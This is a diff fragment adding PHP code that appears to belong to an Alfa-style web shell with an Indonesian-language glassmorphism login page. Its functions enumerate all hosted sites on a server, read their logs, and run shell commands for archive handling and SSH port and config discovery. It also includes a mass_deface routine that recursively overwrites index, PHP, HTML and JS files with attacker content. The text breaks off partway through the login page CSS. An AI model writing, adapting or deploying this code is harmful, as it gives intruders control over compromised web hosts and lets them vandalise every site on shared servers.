+            }
+        }
+    }
+    
+    return [
+        'status' => (count($errors) == 0),
+        'total' => $total,
+        'success' => $success,
+        'errors' => $errors,
+        'message' => "✅ CHMOD by Pattern selesai!\n   📄 File ditemukan: " . $total . "\n   ✅ Berhasil: " . $success . "\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")
+    ];
+}
+
+// ============================================================
+// MULTI-DOMAIN LOG FUNCTIONS
+// ============================================================
+
+function findAllDomains() {
+    $domains = [];
+    
+    $home_dirs = glob('/home/*/public_html', GLOB_ONLYDIR);
+    foreach ($home_dirs as $dir) {
+        $user = basename(dirname($dir));
+        $domains[] = ['path' => $dir, 'user' => $user, 'domain' => $user . ' (Home)'];
+    }
+    
+    $www_dirs = glob('/var/www/*', GLOB_ONLYDIR);
+    foreach ($www_dirs as $dir) {
+        if (is_dir($dir) && (file_exists($dir . '/index.php') || file_exists($dir . '/index.html'))) {
+            $name = basename($dir);
+            $domains[] = ['path' => $dir, 'user' => 'www-data', 'domain' => $name . ' (www)'];
+        }
+    }
+    
+    $vhosts = glob('/var/www/vhosts/*', GLOB_ONLYDIR);
+    foreach ($vhosts as $dir) {
+        if (is_dir($dir)) {
+            $domain = basename($dir);
+            $domains[] = ['path' => $dir, 'user' => 'vhost', 'domain' => $domain . ' (Plesk)'];
+        }
+    }
+    
+    $current = __DIR__;
+    $domains[] = ['path' => $current, 'user' => 'current', 'domain' => 'Current (' . basename($current) . ')'];
+    
+    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
+    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
+    $domains[] = ['path' => $doc_root, 'user' => 'server', 'domain' => $server_name . ' (DocumentRoot)'];
+    
+    return $domains;
+}
+
+function readDomainLog($log_path, $lines = 100, $filter = '') {
+    $log_file = rtrim($log_path, '/') . '/' . $GLOBALS['config']['log_file'];
+    
+    if (!file_exists($log_file)) return "❌ Log file not found: " . $log_file;
+    if (!is_readable($log_file)) return "❌ Log file not readable: " . $log_file;
+    
+    $output = [];
+    $output[] = "📋 ACTIVITY LOG: " . $log_file;
+    $output[] = "================================================";
+    $output[] = "";
+    
+    $content = alfaEx("tail -" . intval($lines) . " '" . addslashes($log_file) . "' 2>&1");
+    
+    if (empty($content)) {
+        $output[] = "⚠️ Log file is empty";
+        return implode("\n", $output);
+    }
+    
+    if (!empty($filter)) {
+        $lines_arr = explode("\n", $content);
+        $filtered = [];
+        foreach ($lines_arr as $line) {
+            if (stripos($line, $filter) !== false) $filtered[] = $line;
+        }
+        $content = implode("\n", $filtered);
+        if (empty($content)) {
+            $output[] = "⚠️ No entries found with filter: " . $filter;
+            return implode("\n", $output);
+        }
+        $output[] = "🔍 Filter: " . $filter . " (" . count($filtered) . " entries)";
+        $output[] = "";
+    }
+    
+    $output[] = $content;
+    return implode("\n", $output);
+}
+
+function aggregateLogs($lines = 50) {
+    $domains = findAllDomains();
+    $all_logs = [];
+    
+    foreach ($domains as $domain) {
+        $log_file = rtrim($domain['path'], '/') . '/' . $GLOBALS['config']['log_file'];
+        if (file_exists($log_file) && is_readable($log_file)) {
+            $content = alfaEx("tail -" . intval($lines) . " '" . addslashes($log_file) . "' 2>&1");
+            if (!empty($content)) {
+                foreach (explode("\n", $content) as $line) {
+                    if (!empty(trim($line))) {
+                        $all_logs[] = ['domain' => $domain['domain'], 'path' => $domain['path'], 'line' => $line];
+                    }
+                }
+            }
+        }
+    }
+    
+    usort($all_logs, function($a, $b) {
+        preg_match('/\[(.*?)\]/', $a['line'], $match_a);
+        preg_match('/\[(.*?)\]/', $b['line'], $match_b);
+        if (isset($match_a[1]) && isset($match_b[1])) {
+            return strtotime($match_b[1]) - strtotime($match_a[1]);
+        }
+        return 0;
+    });
+    
+    return $all_logs;
+}
+
+function monitorFileChanges($minutes = 10) {
+    $domains = findAllDomains();
+    $changes = [];
+    $since = time() - ($minutes * 60);
+    
+    foreach ($domains as $domain) {
+        $path = $domain['path'];
+        if (!is_dir($path)) continue;
+        
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        
+        foreach ($iterator as $file) {
+            if ($file->isFile()) {
+                $mtime = $file->getMTime();
+                if ($mtime >= $since) {
+                    $changes[] = [
+                        'domain' => $domain['domain'],
+                        'path' => $file->getPathname(),
+                        'name' => $file->getFilename(),
+                        'size' => $file->getSize(),
+                        'modified' => date('Y-m-d H:i:s', $mtime),
+                        'type' => 'modified'
+                    ];
+                }
+            }
+        }
+    }
+    
+    return $changes;
+}
+
+function logActivityMulti($message, $domain_path = null) {
+    global $config;
+    if (!$config['log_activity']) return;
+    
+    if (empty($domain_path)) $domain_path = __DIR__;
+    
+    $log_file = rtrim($domain_path, '/') . '/' . $config['log_file'];
+    $log_entry = '[' . date('Y-m-d H:i:s') . '] ' . 
+                 'IP: ' . $_SERVER['REMOTE_ADDR'] . ' | ' . 
+                 'User: ' . $config['username'] . ' | ' . 
+                 $message . "\n";
+    @file_put_contents($log_file, $log_entry, FILE_APPEND);
+}
+
+// ============================================================
+// EXTRACT FUNCTIONS
+// ============================================================
+
+function extract_file($file_path, $extract_to = '') {
+    if(empty($extract_to)) {
+        $extract_to = dirname($file_path) . '/' . pathinfo($file_path, PATHINFO_FILENAME);
+    }
+    if(!is_dir($extract_to)) @mkdir($extract_to, 0777, true);
+    
+    $mime_type = _get_mime_type($file_path);
+    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
+    if(strpos(basename($file_path), '.tar.gz') !== false) $mime_type = 'application/x-tar+gz';
+    
+    $result = array('status' => false, 'message' => '');
+    
+    switch($mime_type) {
+        case 'zip':
+        case 'application/zip':
+            $result = _extract_zip($file_path, $extract_to);
+            break;
+        case 'tar':
+        case 'application/x-tar':
+            $result = _extract_tar($file_path, $extract_to);
+            break;
+        case 'gz':
+        case 'gzip':
+        case 'application/x-gzip':
+            if(strpos(basename($file_path), '.tar.gz') !== false) {
+                $result = _extract_targz($file_path, $extract_to);
+            } else {
+                $result = _extract_gz($file_path, $extract_to);
+            }
+            break;
+        case 'application/x-tar+gz':
+        case 'tgz':
+            $result = _extract_targz($file_path, $extract_to);
+            break;
+        case 'rar':
+        case 'application/x-rar':
+            $result = _extract_rar($file_path, $extract_to);
+            break;
+        default:
+            if($ext == 'zip') $result = _extract_zip($file_path, $extract_to);
+            elseif($ext == 'tar') $result = _extract_tar($file_path, $extract_to);
+            elseif($ext == 'gz') $result = _extract_gz($file_path, $extract_to);
+            elseif($ext == 'rar') $result = _extract_rar($file_path, $extract_to);
+            else $result['message'] = "Unsupported file type: " . $mime_type;
+    }
+    return $result;
+}
+
+function _extract_zip($file, $target) {
+    if(_alfa_can_runCommand()) {
+        $cmd = "unzip -o '" . addslashes($file) . "' -d '" . addslashes($target) . "' 2>&1";
+        alfaEx($cmd);
+        if(is_dir($target) && count(scandir($target)) > 2) {
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        }
+    }
+    if(class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        if($zip->open($file) === true) {
+            $zip->extractTo($target);
+            $zip->close();
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        }
+    }
+    return array('status' => false, 'message' => "❌ Failed to extract ZIP file");
+}
+
+function _extract_tar($file, $target) {
+    if(_alfa_can_runCommand()) {
+        $cmd = "tar -xf '" . addslashes($file) . "' -C '" . addslashes($target) . "' 2>&1";
+        alfaEx($cmd);
+        if(is_dir($target) && count(scandir($target)) > 2) {
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        }
+    }
+    if(class_exists('PharData')) {
+        try {
+            $phar = new PharData($file);
+            $phar->extractTo($target);
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        } catch(Exception $e) {}
+    }
+    return array('status' => false, 'message' => "❌ Failed to extract TAR file");
+}
+
+function _extract_gz($file, $target) {
+    if(_alfa_can_runCommand()) {
+        $output_file = $target . '/' . str_replace('.gz', '', basename($file));
+        $cmd = "gunzip -c '" . addslashes($file) . "' > '" . addslashes($output_file) . "'";
+        alfaEx($cmd);
+        if(file_exists($output_file)) {
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $output_file);
+        }
+    }
+    if(function_exists('gzdecode')) {
+        $content = file_get_contents($file);
+        $decoded = gzdecode($content);
+        if($decoded !== false) {
+            $output_file = $target . '/' . str_replace('.gz', '', basename($file));
+            file_put_contents($output_file, $decoded);
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $output_file);
+        }
+    }
+    return array('status' => false, 'message' => "❌ Failed to extract GZ file");
+}
+
+function _extract_targz($file, $target) {
+    if(_alfa_can_runCommand()) {
+        $cmd = "tar -xzf '" . addslashes($file) . "' -C '" . addslashes($target) . "' 2>&1";
+        alfaEx($cmd);
+        if(is_dir($target) && count(scandir($target)) > 2) {
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        }
+    }
+    if(class_exists('PharData')) {
+        try {
+            if(strpos(basename($file), '.tar.gz') !== false) {
+                $new_file = $target . '/' . basename($file);
+                @copy($file, $new_file);
+                $new_tar = str_replace('.tar.gz', '.tar', $new_file);
+                $p = new PharData($new_file);
+                $p->decompress();
+                $phar = new PharData($new_tar);
+                $phar->extractTo($target);
+                @unlink($new_file);
+                @unlink($new_tar);
+            } else {
+                $phar = new PharData($file);
+                $phar->extractTo($target);
+            }
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        } catch(Exception $e) {}
+    }
+    return array('status' => false, 'message' => "❌ Failed to extract TAR.GZ file");
+}
+
+function _extract_rar($file, $target) {
+    if(_alfa_can_runCommand() && alfaWhich('unrar')) {
+        $cmd = "unrar x -o+ '" . addslashes($file) . "' '" . addslashes($target) . "'";
+        alfaEx($cmd);
+        if(is_dir($target) && count(scandir($target)) > 2) {
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        }
+    }
+    if(class_exists('RarArchive')) {
+        $rar = RarArchive::open($file);
+        if($rar) {
+            $entries = $rar->getEntries();
+            foreach($entries as $entry) $entry->extract($target);
+            $rar->close();
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        }
+    }
+    return array('status' => false, 'message' => "❌ Failed to extract RAR file");
+}
+
+function _get_mime_type($file) {
+    if(function_exists('finfo_open')) {
+        $finfo = finfo_open(FILEINFO_MIME_TYPE);
+        $mime = finfo_file($finfo, $file);
+        finfo_close($finfo);
+        return $mime;
+    }
+    if(function_exists('mime_content_type')) return mime_content_type($file);
+    if(_alfa_can_runCommand()) {
+        $mime = alfaEx("file -b --mime-type '" . addslashes($file) . "'");
+        if(!empty($mime)) return trim($mime);
+    }
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    $mime_types = [
+        'zip' => 'application/zip', 'rar' => 'application/x-rar',
+        'tar' => 'application/x-tar', 'gz' => 'application/x-gzip',
+        'tgz' => 'application/x-tar+gz', '7z' => 'application/x-7z-compressed'
+    ];
+    return isset($mime_types[$ext]) ? $mime_types[$ext] : 'unknown';
+}
+
+function zip_file($source, $destination) {
+    if(_alfa_can_runCommand()) {
+        if($GLOBALS['sys'] == 'win') {
+            $cmd = "powershell Compress-Archive -Path '" . addslashes($source) . "' -DestinationPath '" . addslashes($destination) . "'";
+        } else {
+            $cmd = "zip -r '" . addslashes($destination) . "' '" . addslashes($source) . "'";
+        }
+        alfaEx($cmd);
+        if(file_exists($destination)) {
+            return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
+        }
+    }
+    if(class_exists('ZipArchive')) {
+        if(_zip_with_php($source, $destination)) {
+            return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
+        }
+    }
+    return array('status' => false, 'message' => "❌ Failed to create ZIP file");
+}
+
+function _zip_with_php($source, $destination) {
+    if(!extension_loaded('zip') || !file_exists($source)) return false;
+    $zip = new ZipArchive();
+    if(!$zip->open($destination, ZIPARCHIVE::CREATE)) return false;
+    $source = str_replace('\\', '/', realpath($source));
+    if(is_dir($source) === true) {
+        $files = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($source),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach($files as $file) {
+            $file = str_replace('\\', '/', $file);
+            if(in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) continue;
+            $file = realpath($file);
+            if(is_dir($file) === true) {
+                $zip->addEmptyDir(str_replace($source.'/', '', $file.'/'));
+            } else if(is_file($file) === true) {
+                $zip->addFromString(str_replace($source.'/', '', $file), file_get_contents($file));
+            }
+        }
+    } else if(is_file($source) === true) {
+        $zip->addFromString(basename($source), file_get_contents($source));
+    }
+    return $zip->close();
+}
+
+function mass_deface($dir, $filename, $content, $method = 'all') {
+    if(!is_dir($dir) || !is_readable($dir)) {
+        return array('status' => false, 'message' => "❌ Directory not readable");
+    }
+    $result = array('status' => true, 'files' => 0, 'message' => '');
+    _mass_deface_recursive($dir, $filename, $content, $method, $result);
+    $result['message'] = "✅ Done! Total " . $result['files'] . " files defaced";
+    return $result;
+}
+
+function _mass_deface_recursive($dir, $filename, $content, $method, &$result) {
+    if(!is_dir($dir)) return;
+    $items = scandir($dir);
+    foreach($items as $item) {
+        if($item == '.' || $item == '..') continue;
+        $path = $dir . '/' . $item;
+        if(is_dir($path)) {
+            _mass_deface_recursive($path, $filename, $content, $method, $result);
+        } elseif(is_file($path) && is_writable($path)) {
+            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+            if($method == 'all') {
+                file_put_contents($path, $content);
+                $result['files']++;
+            } elseif($method == 'index') {
+                $index_files = array('index.php', 'index.htm', 'index.html', 'default.asp', 'default.aspx', 'index.asp', 'index.aspx');
+                if(in_array(basename($path), $index_files)) {
+                    file_put_contents($path, $content);
+                    $result['files']++;
+                }
+            } elseif($method == 'ext') {
+                $extensions = array('php', 'html', 'htm', 'asp', 'aspx', 'js');
+                if(in_array($ext, $extensions)) {
+                    file_put_contents($path, $content);
+                    $result['files']++;
+                }
+            } else {
+                if(basename($path) == $filename) {
+                    file_put_contents($path, $content);
+                    $result['files']++;
+                }
+            }
+        }
+    }
+}
+
+// ============================================================
+// SSH DETECTOR & CONFIG READER
+// ============================================================
+
+function sshDetector() {
+    $output = [];
+    $output[] = "🔍 SSH DETECTOR (Auto Detect)";
+    $output[] = "==============================";
+    $output[] = "";
+    
+    $output[] = "📊 1. SSH Process Check:";
+    $ssh_proc = alfaEx("ps aux | grep [s]shd | grep -v grep");
+    if (!empty($ssh_proc)) {
+        $output[] = "  ✅ SSH Process Running:";
+        foreach (explode("\n", $ssh_proc) as $line) {
+            if (!empty($line)) $output[] = "  " . $line;
+        }
+    } else {
+        $output[] = "  ❌ No SSH process found!";
+    }
+    $output[] = "";
+    
+    $output[] = "📡 2. Detecting SSH Port:";
+    $netstat = alfaEx("netstat -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2");
+    if (!empty($netstat)) {
+        $output[] = "  ✅ SSH Port: " . trim($netstat);
+    } else {
+        $ss = alfaEx("ss -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2");
+        if (!empty($ss)) {
+            $output[] = "  ✅ SSH Port: " . trim($ss);
+        } else {
+            $output[] = "  ⚠️ Could not detect SSH port (using default: 22)";
+        }
+    }
+    $output[] = "";
+    
+    $output[] = "⚙️ 3. SSH Service Status:";
+    $status = alfaEx("systemctl is-active sshd 2>/dev/null");
+    if ($status == "active") {
+        $output[] = "  ✅ SSH Service: ACTIVE";
+    } elseif ($status == "inactive") {
+        $output[] = "  ❌ SSH Service: INACTIVE";
+    } else {
+        $status2 = alfaEx("service sshd status 2>/dev/null | grep -E 'running|active|start'");
+        if (!empty($status2)) {
+            $output[] = "  ✅ " . trim($status2);
+        } else {
+            $output[] = "  ⚠️ Service status unknown";
+        }
+    }
+    $output[] = "";
+    
+    $output[] = "📦 4. SSH Version:";
+    $version = alfaEx("sshd -V 2>&1 | head -1");
+    if (!empty($version)) {
+        $output[] = "  " . trim($version);
+    }
+    $output[] = "";
+    
+    $output[] = "📋 SUMMARY";
+    $output[] = "================";
+    $output[] = "✅ SSH is " . (!empty($ssh_proc) ? "RUNNING" : "NOT RUNNING");
+    $port = trim($netstat) ?: "22";
+    $output[] = "✅ SSH Port: " . $port;
+    $output[] = "";
+    $output[] = "🔑 To Connect: ssh -p " . $port . " username@" . $_SERVER['HTTP_HOST'];
+    
+    return implode("\n", $output);
+}
+
+function readSSHConfig($config_path = null) {
+    $output = [];
+    $output[] = "📄 SSH CONFIG READER";
+    $output[] = "====================";
+    $output[] = "";
+    
+    if (empty($config_path)) {
+        $find = alfaEx("find / -name 'sshd_config' 2>/dev/null | head -5");
+        if (empty($find)) {
+            $output[] = "❌ No sshd_config found!";
+            $output[] = "💡 Using default SSH port: 22";
+            return implode("\n", $output);
+        }
+        $config_path = trim(explode("\n", $find)[0]);
+        $output[] = "🔍 Found config at: " . $config_path;
+        $output[] = "";
+    }
+    
+    if (!file_exists($config_path)) {
+        $output[] = "❌ Config file not found: " . $config_path;
+        return implode("\n", $output);
+    }
+    
+    $output[] = "📋 IMPORTANT CONFIGURATIONS:";
+    $output[] = "---------------------------";
+    
+    $important_keys = [
+        'Port' => 'SSH Port',
+        'PermitRootLogin' => 'Root Login',
+        'PasswordAuthentication' => 'Password Auth',
+        'PubkeyAuthentication' => 'Public Key Auth',
+        'AllowUsers' => 'Allowed Users',
+        'MaxAuthTries' => 'Max Auth Tries'
+    ];
+    
+    $port = "22";
+    foreach ($important_keys as $key => $label) {
+        $value = alfaEx("grep -E '^" . $key . "\\s+' " . $config_path . " 2>/dev/null | head -1 | awk '{print \$2}'");
+        if (!empty($value)) {
+            if ($key == 'Port') $port = trim($value);
+            $output[] = "  ✅ " . $label . ": " . trim($value);
+        }
+    }
+    $output[] = "";
+    
+    $output[] = "📋 SUMMARY";
+    $output[] = "==========";
+    $output[] = "✅ Config file: " . $config_path;
+    $output[] = "✅ SSH Port: " . $port;
+    $output[] = "";
+    $output[] = "🔑 To connect: ssh -p " . $port . " username@" . $_SERVER['HTTP_HOST'];
+    
+    return implode("\n", $output);
+}
+
+function quickSSHPort() {
+    $output = [];
+    $output[] = "🎯 QUICK SSH PORT";
+    $output[] = "================";
+    $output[] = "";
+    
+    $methods = [
+        'netstat' => "netstat -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2",
+        'ss' => "ss -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2",
+        'lsof' => "lsof -i -P -n 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$9}' | cut -d: -f2"
+    ];
+    
+    $port = null;
+    foreach ($methods as $name => $cmd) {
+        $result = alfaEx($cmd);
+        if (!empty($result) && is_numeric(trim($result))) {
+            $port = trim($result);
+            $output[] = "✅ SSH Port: " . $port . " (from " . $name . ")";
+            break;
+        }
+    }
+    
+    if (empty($port)) {
+        $output[] = "⚠️ Could not detect SSH port";
+        $port = "22";
+        $output[] = "📝 Using default port: 22";
+    }
+    
+    $output[] = "";
+    $output[] = "🔑 SSH Connection:";
+    $output[] = "  ssh -p " . $port . " username@" . $_SERVER['HTTP_HOST'];
+    
+    return implode("\n", $output);
+}
+
+// ============================================================
+// LOGIN SYSTEM
+// ============================================================
+
+function requireLogin() {
+    global $config;
+    
+    if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $config['session_timeout'])) {
+        session_destroy();
+        session_start();
+    }
+    $_SESSION['last_activity'] = time();
+    
+    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
+        if ($_POST['login_user'] === $config['username'] && 
+            password_verify($_POST['login_pass'], $config['password_hash'])) {
+            $_SESSION['logged_in'] = true;
+            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
+            logActivityMulti("Login successful from " . $_SERVER['REMOTE_ADDR']);
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            logActivityMulti("Login failed from " . $_SERVER['REMOTE_ADDR']);
+            echo "<script>alert('Login gagal!');</script>";
+        }
+    }
+    
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        showLoginPage();
+        exit;
+    }
+}
+
+// ============================================================
+// CUSTOM LOGIN PAGE - PREMIUM GLASSMORPHISM
+// ============================================================
+
+function showLoginPage() {
+    global $branding;
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title><?php echo $branding['name']; ?> - Login</title>
+        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: 'Poppins', sans-serif;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: #0a0e1a;
+                position: relative;
+                overflow: hidden;
+            }
+
+            /* ===== BACKGROUND ANIMATION ===== */
+            .bg-layer {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 0;
+                background: 
+                    radial-gradient(ellipse at 20% 50%, rgba(66, 165, 245, 0.08) 0%, transparent 60%),
+                    radial-gradient(ellipse at 80% 50%, rgba(124, 77, 255, 0.06) 0%, transparent 60%),
+                    radial-gradient(ellipse at 50% 100%, rgba(0, 229, 255, 0.04) 0%, transparent 40%),
+                    #0a0e1a;
+            }
+
+            /* ===== FLOATING ORBS ===== */
+            .orb {
+                position: fixed;
+                border-radius: 50%;
+                filter: blur(80px);
+                opacity: 0.2;
+                z-index: 0;
+                animation: orbFloat 20s ease-in-out infinite alternate;
+            }
+            .orb-1 {
+                width: 300px;
+                height: 300px;
+                background: rgba(66, 165, 245, 0.15);
+                top: -80px;
+                right: -80px;
+                animation-delay: 0s;
+            }
+            .orb-2 {
+                width: 250px;
+                height: 250px;
+                background: rgba(124, 77, 255, 0.12);
+                bottom: -60px;
+                left: -60px;
+                animation-delay: -7s;
+            }
+            .orb-3 {
+                width: 180px;
+                height: 180px;
+                background: rgba(0, 229, 255, 0.08);
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                animation-delay: -14s;
+            }
+
+            @keyframes orbFloat {
+                0% { transform: translate(0, 0) scale(1); }
+                33% { transform: translate(40px, -40px) scale(1.15); }
+                66% { transform: translate(-30px, 30px) scale(0.85); }
+                100% { transform: translate(20px, -20px) scale(1.05); }
+            }
+
+            /* ===== GRID OVERLAY ===== */
+            .grid-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 0;
+                background-image: 
+                    linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+                background-size: 60px 60px;
+                animation: gridMove 30s linear infinite;
+            }
+
+            @keyframes gridMove {
+                0% { transform: translate(0, 0); }
+                100% { transform: translate(60px, 60px); }
+            }
+
+            /* ===== PARTICLES ===== */
+            .particles {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 0;
+                overflow: hidden;
+                pointer-events: none;
+            }
+
+            .particle {
+                position: absolute;
+                width: 2px;
+                height: 2px;
+                background: rgba(255, 255, 255, 0.15);
+                border-radius: 50%;
+                animation: particleFloat linear infinite;
+            }
+
+            .particle:nth-child(1) { left: 10%; animation-duration: 18s; animation-delay: 0s; }
+            .particle:nth-child(2) { left: 20%; animation-duration: 22s; animation-delay: 2s; }
+            .particle:nth-child(3) { left: 30%; animation-duration: 16s; animation-delay: 4s; }
+            .particle:nth-child(4) { left: 40%; animation-duration: 20s; animation-delay: 1s; }
+            .particle:nth-child(5) { left: 50%; animation-duration: 24s; animation-delay: 3s; }
+            .particle:nth-child(6) { left: 60%; animation-duration: 18s; animation-delay: 5s; }
+            .particle:nth-child(7) { left: 70%; animation-duration: 21s; animation-delay: 2s; }
+            .particle:nth-child(8) { left: 80%; animation-duration: 19s; animation-delay: 4s; }
+            .particle:nth-child(9) { left: 90%; animation-duration: 23s; animation-delay: 1s; }
+            .particle:nth-child(10) { left: 15%; animation-duration: 17s; animation-delay: 3s; }
+            .particle:nth-child(11) { left: 35%; animation-duration: 20s; animation-delay: 0s; }
+            .particle:nth-child(12) { left: 55%; animation-duration: 22s; animation-delay: 2s; }
+            .particle:nth-child(13) { left: 75%; animation-duration: 18s; animation-delay: 4s; }
+            .particle:nth-child(14) { left: 85%; animation-duration: 21s; animation-delay: 1s; }
+            .particle:nth-child(15) { left: 95%; animation-duration: 19s; animation-delay: 3s; }
+
+            @keyframes particleFloat {
+                0% { transform: translateY(100vh) scale(0); opacity: 0; }
+                10% { opacity: 1; }
+                90% { opacity: 1; }
+                100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+            }
+
+            /* ===== LOGIN WRAPPER ===== */
+            .login-wrapper {
+                position: relative;
+                z-index: 1;
+                width: 100%;
+                max-width: 360px;
+                padding: 15px;
+            }
+
+            /* ===== LOGIN CONTAINER ===== */
+            .login-container {
+                background: rgba(20, 28, 58, 0.55);
+                backdrop-filter: blur(24px);
+                -webkit-backdrop-filter: blur(24px);
+                border-radius: 20px;
+                padding: 35px 32px 30px;
+                border: 1px solid rgba(255, 255, 255, 0.06);
+                box-shadow: 
+                    0 30px 80px rgba(0, 0, 0, 0.5),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.05);
+                position: relative;
+                overflow: hidden;
+                transition: all 0.4s ease;
+            }
+
+            .login-container:hover {
+                border-color: rgba(255, 255, 255, 0.08);
+                box-shadow: 
+                    0 40px 100px rgba(0, 0, 0, 0.6),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.08);
+            }
+
+            .login-container::before {
+                content: '';
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: radial-gradient(circle at 30% 30%, rgba(66, 165, 245, 0.03), transparent 50%);
+                animation: shineRotate 25s linear infinite;
+                pointer-events: none;
+            }
+
+            @keyframes shineRotate {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+            /* ===== GLASS REFLECTION ===== */
+            .glass-reflection {
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: radial-gradient(ellipse at 70% 20%, rgba(255, 255, 255, 0.02), transparent 50%);
+                pointer-events: none;
+                border-radius: 50%;
+                transform: rotate(-20deg);
+            }
+
+            /* ===== BRAND HEADER ===== */
+            .brand-header {
+                text-align: center;
+                margin-bottom: 28px;
+                position: relative;
+            }
+
+            .brand-icon {
+                display: inline-block;
+                font-size: 36px;
+                margin-bottom: 10px;
+                background: linear-gradient(135deg, #42a5f5, #7c4dff);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                filter: drop-shadow(0 0 25px rgba(66, 165, 245, 0.2));
+                animation: iconPulse 3s ease-in-out infinite;
+            }
+
+            @keyframes iconPulse {
+                0%, 100% { transform: scale(1); }
+                50% { transform: scale(1.06); }
+            }
+
+            .brand-title {
+                font-size: 20px;
+                font-weight: 700;
+                color: #ffffff;
+                letter-spacing: 1.5px;
+                text-shadow: 0 0 30px rgba(66, 165, 245, 0.1);
+            }
+
+            .brand-title span {
+                background: linear-gradient(135deg, #42a5f5, #7c4dff);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+            }
+
+            .brand-divider {
+                width: 40px;
+                height: 1.5px;
+                background: linear-gradient(90deg, transparent, rgba(66, 165, 245, 0.3), transparent);
+                margin: 8px auto;
+                border-radius: 2px;
+            }
+
+            .brand-sub {
+                font-size: 9px;
+                color: rgba(255, 255, 255, 0.15);
+                letter-spacing: 3px;
+                text-transform: uppercase;
+                font-weight: 300;
+            }
+
+            .brand-version {
+                display: inline-block;
+                padding: 2px 10px;
+                background: rgba(66, 165, 245, 0.06);
+                border: 1px solid rgba(66, 165, 245, 0.08);
+                border-radius: 20px;
+                font-size: 8px;
+                color: rgba(255, 255, 255, 0.15);
+                letter-spacing: 1px;
+                margin-top: 6px;
+            }
+
+            /* ===== FORM ===== */
+            .login-form {
+                position: relative;
+            }
+
+            .form-group {
+                margin-bottom: 16px;
+                position: relative;
+            }
+
+            .form-group label {
+                display: block;
+                font-size: 10px;
+                font-weight: 500;
+                color: rgba(255, 255, 255, 0.2);
+                margin-bottom: 5px;
+                letter-spacing: 0.8px;
+                text-transform: uppercase;
+                transition: 0.3s;
+            }
+
+            .form-group .input-wrapper {
+                position: relative;
+                background: rgba(255, 255, 255, 0.03);
+                border: 1px solid rgba(255, 255, 255, 0.05);
+                border-radius: 10px;
+                transition: all 0.3s ease;
+                overflow: hidden;
+            }
+
+            .form-group .input-wrapper:focus-within {
+                border-color: rgba(66, 165, 245, 0.2);
+                background: rgba(255, 255, 255, 0.05);
+                box-shadow: 0 0 25px rgba(66, 165, 245, 0.03);
+            }
+
+            .form-group .input-wrapper .icon {
+                position: absolute;
+                left: 12px;
+                top: 50%;
+                transform: translateY(-50%);
+                color: rgba(255, 255, 255, 0.08);
+                font-size: 12px;
+                pointer-events: none;
+                transition: 0.3s;
+            }
+
+            .form-group .input-wrapper:focus-within .icon {
